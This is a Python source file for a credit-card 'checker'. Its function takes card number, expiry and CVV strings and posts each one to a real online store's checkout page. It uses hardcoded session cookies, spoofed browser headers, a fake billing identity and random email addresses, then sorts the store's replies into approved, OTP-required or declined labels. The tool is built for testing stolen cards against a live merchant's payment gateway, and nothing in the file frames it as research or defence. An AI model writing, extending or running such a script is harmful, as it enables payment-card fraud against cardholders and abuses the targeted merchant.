import requests
import re
import random
import string
import json

def process_pf_card(cc):
    """
    Process credit card through Payflow gateway [0.98$]
    Returns: dict with status, response, and gateway
    """
    try:
        # Parse the card details
        parts = cc.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Payflow [0.98$]"
            }
        
        card_number, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        # Format year if needed
        if len(yy) == 2:
            yy = "20" + yy

        # Common cookies and headers
        cookies = {
            'PHPSESSID': 'fvu5gfnknkqji49n4jdlimv1f7',
            'bid_48b113f42dc09a04ef102654144bd0f3': '84deb6a2a19a3574b34723efcf6bf817',
        }
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        
        def generate_random_email():
            """Generate a random email address"""
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            return f"{username}@{domain}"
        
        def extract_error_message(response_text):
            """Extract error message from HTML response"""
            error_pattern = r'<div class="ERRORS">(.*?)</div>'
            match = re.search(error_pattern, response_text)
            if match:
                return match.group(1).strip()
            else:
                # Try alternative error patterns
                alt_patterns = [
                    r'<div class="error">(.*?)</div>',
                    r'<div class="alert alert-error">(.*?)</div>',
                    r'class="error_message">(.*?)<',
                    r'Error:(.*?)<'
                ]
                for pattern in alt_patterns:
                    match = re.search(pattern, response_text, re.IGNORECASE)
                    if match:
                        return match.group(1).strip()
                return "No specific error message found"

        # Generate random email
        random_email = generate_random_email()
        
        # Prepare POST data
        headers5 = headers.copy()
        headers5.update({
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://stores.modularmarket.com',
            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
        })
        
        data = {
            'coupon_codes': '',
            'reward_points': '',
            'bill_first_name': 'dark',
            'bill_last_name': 'boy',
            'bill_address_1': 'New York',
            'bill_address_2': '',
            'bill_city': 'New York',
            'bill_state': 'NY_US',
            'bill_zip': '10200',
            'bill_country': 'US',
            'phone': '9685698569',
            'email': random_email,
            'email_confirm': random_email,
            'password': 'Darkboy336',
            'password_confirm': 'Darkboy336',
            'slot_2': 'Darkboy',
            'slot_1': card_number,
            'slot_3': mm,
            'slot_4': yy,
            'cc_security': cvv,
            'submit_pay_with_cc': 'Pay With Credit Card',
            'submit_paypal_wps_capture_order_checksum': 'ac1dd209cbcc5e5d1c6e28598e8cbbe8',
            'nectar_decanter': '',
        }
        
        # Make the request
        response = requests.post(
            'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
            cookies=cookies,
            headers=headers5,
            data=data,
            timeout=30
        )
        
        if response.status_code == 200:
            error_message = extract_error_message(response.text)
            
            # Determine status based on response
            response_lower = response.text.lower()
            error_lower = error_message.lower()
            
            if 'thank you' in response_lower or 'success' in response_lower or 'approved' in response_lower:
                return {
                    "status": "APPROVED",
                    "response": "Payment Approved",
                    "gateway": "Payflow [0.98$]"
                }
            elif 'cvv' in error_lower or 'security code' in error_lower:
                return {
                    "status": "APPROVED_OTP",
                    "response": "CVV Required/OTP",
                    "gateway": "Payflow [0.98$]"
                }
            elif 'insufficient' in error_lower or 'funds' in error_lower:
                return {
                    "status": "APPROVED",
                    "response": "Insufficient Funds",
                    "gateway": "Payflow [0.98$]"
                }
            elif 'declined' in error_lower or 'cannot be processed' in error_lower:
                return {
                    "status": "DECLINED",
                    "response": error_message[:100] if error_message else "Payment Declined",
                    "gateway": "Payflow [0.98$]"
                }
            else:
                return {
                    "status": "DECLINED",
                    "response": error_message[:100] if error_message else "Unknown response",
                    "gateway": "Payflow [0.98$]"
                }
        else:
            return {
                "status": "ERROR",
                "response": f"HTTP Error: {response.status_code}",
                "gateway": "Payflow [0.98$]"
            }
            
    except requests.Timeout:
        return {
            "status": "ERROR",
            "response": "Request timeout",
            "gateway": "Payflow [0.98$]"
        }
    except requests.ConnectionError:
        return {
            "status": "ERROR",
            "response": "Connection error",
            "gateway": "Payflow [0.98$]"
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing error: {str(e)}",
            "gateway": "Payflow [0.98$]"
        }
